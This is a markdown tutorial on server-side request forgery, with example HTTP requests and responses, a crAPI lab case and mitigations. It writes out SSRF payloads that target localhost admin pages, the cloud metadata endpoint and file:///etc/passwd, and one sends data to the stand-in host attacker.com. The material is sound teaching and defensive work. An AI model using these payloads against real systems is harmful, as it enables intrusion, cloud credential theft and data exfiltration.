# Server-Side Request Forgery (SSRF)

**Server-Side Request Forgery (SSRF)** is a vulnerability where an attacker can manipulate a server into making unintended requests to internal or external resources. This allows attackers to interact with systems that are not directly accessible from the outside.

---

## 🔍 Example 1: Internal Service Exposure

### 📥 Request

```
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:8080/admin"
}
```

---

### ⚠️ Vulnerable Response

```
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>Admin Panel</title></head>
<body>
<h1>Welcome to the Admin Panel</h1>
<form>
  <input type="password" placeholder="Admin Password">
</form>
</body>
</html>
```

---

### 🚨 Issue

The application fetches arbitrary URLs from user-provided input with insufficient validation.

- Attackers can force requests to internal services (`127.0.0.1`, `localhost`, `169.254.169.254`, private IP ranges).
- This may expose internal admin interfaces, metadata services, or sensitive systems.

### 🎯 Impact

- 🔐 Sensitive internal resources can be accessed.
- 👤 Potential data leakage (internal APIs, metadata, credentials).
- 🧨 Pivot to further attacks (internal network discovery, remote request chaining).

---

### 🛡️ Mitigations

1. Validate and sanitize URLs: allow only approved external endpoints.
2. Block internal/reserved IP ranges and localhost in outgoing requests.
3. Implement an allowlist (whitelist) and denylist (blacklist) for remote URLs.
4. Use a safe proxy/gateway for outbound connections with strict filtering.
5. Enforce a strict URL parsing/severity policy to reject malformed or obfuscated addresses.

---

## 🔍 Example 2: Cloud Metadata API Access

### 📥 Request

```
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

---

### ⚠️ Vulnerable Response

```
HTTP/1.1 200 OK
Content-Type: text/plain

ami-id: ami-12345678
instance-type: t2.micro
public-hostname: ec2-198-51-100-1.compute-1.amazonaws.com
```

---

### 🚨 Impact

- ☁️ Exposure of sensitive cloud metadata, including instance identifiers and credential endpoints.
- 🔐 Potential credential leakage for cloud service roles.
- 🧨 Enables lateral movement within cloud environment.

---

## 🔍 Example 3: Local File Access via file://

### 📥 Request

```
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "file:///etc/passwd"
}
```

---

### ⚠️ Vulnerable Response

```
HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

---

### 🚨 Impact

- 📁 Arbitrary file read from server filesystem.
- 🔓 Exposure of system user accounts and potential attack surface.
- 🔐 May lead to disclosure of secrets in config files.

---

## 🔍 Example 4: Data Exfiltration

### 📥 Request

```
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://attacker.com/log?data=sensitive-data"
}
```

---

### ⚠️ Vulnerable Behavior

```
GET /log?data=sensitive-data HTTP/1.1
Host: attacker.com
User-Agent: vulnerable-app-proxy
```

---

### 🚨 Impact

- 🕵️ Sensitive data transmitted to attacker-controlled server.
- ↩️ Server acts as a data exfiltration channel.
- 🧨 Can be used for stealthy data theft or command-and-control.

---

## 🔍 Example 5: Internal Port Scanning

### 📥 Request (Open Port)

```
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:22"
}
```

---

### ⚠️ Response

```
HTTP/1.1 200 OK
Content-Type: text/plain

SSH-2.0-OpenSSH_7.9
```

---

### 📥 Request (Closed Port)

```
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://127.0.0.1:81"
}
```

---

### 🚨 Impact

- 🔍 Attackers can enumerate internal services by observing response differences.
- 🌐 Facilitates internal network mapping and next-stage attacks.

---

## 🔍 Example 6: DNS Rebinding

### 📥 Request

```
POST /fetchData HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://rebind.victim.com"
}
```

---

### ⚠️ Vulnerable Response

```
HTTP/1.1 200 OK
Content-Type: text/plain

Internal Service Response Detected
```

---

### 🚨 Impact

- 🌍 External domains resolving to internal IPs allow internal-service access.
- 🧩 Bypasses standard host-based filtering by abusing DNS behavior.
- 🔓 Can enable remote access to unintended internal resources.

---

## 🔍 Example 7: crAPI Lab – SSRF via mechanic_api Parameter

### 🧩 Endpoint

`http://192.168.1.28:8888/workshop/api/merchant/contact_mechanic`

### 📥 Request

```
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: 192.168.1.28:8888
Content-Length: 176
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "mechanic_code": "TRAC_JHN",
  "problem_details": "test",
  "vin": "4CVZR19NKXF615223",
  "mechanic_api": "http://192.168.1.28:8025",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}
```

---

### 🚨 Vulnerability Description

The `mechanic_api` parameter is user-controlled and used by the backend to make HTTP requests. This allows attackers to manipulate the destination of the request and access internal resources.

---

## 🧪 Exploitation Scenarios

- Access internal services:
  - `"mechanic_api": "http://127.0.0.1:8080/admin"`
- Access cloud metadata:
  - `"mechanic_api": "http://169.254.169.254/latest/meta-data/"`
- Perform port scanning:
  - `"mechanic_api": "http://127.0.0.1:22"`
- Exfiltrate data:
  - `"mechanic_api": "http://attacker.com/log"`

Impact: The application acts as a proxy, allowing attackers to interact with internal and external systems.

---

## 🛡️ Mitigation Strategies

### Input Validation

- Restrict URLs to trusted domains (allowlist).
- Block localhost and private IP ranges.
- Validate resolved IP addresses after DNS lookup.

---

### Protocol Restrictions

Disable unsupported schemes:

- `file://`
- `ftp://`
- `gopher://`

Only allow `http://` and `https://` for outbound requests.

---

### Network Controls

- Implement outbound filtering (egress rules).
- Restrict access to internal services at the network layer.
- Separate internal networks from application servers.

---

### Cloud Protections

- Enforce metadata service protections (e.g., IMDSv2).
- Apply least privilege access controls for cloud service roles.
- Disable or restrict access to metadata endpoints from application servers.

---

### Application-Level Controls

- Do not directly fetch user-supplied URLs.
- Use intermediary services with strict validation.
- Log and monitor all outbound requests for anomalies.
- Implement request signing and verification mechanisms.

---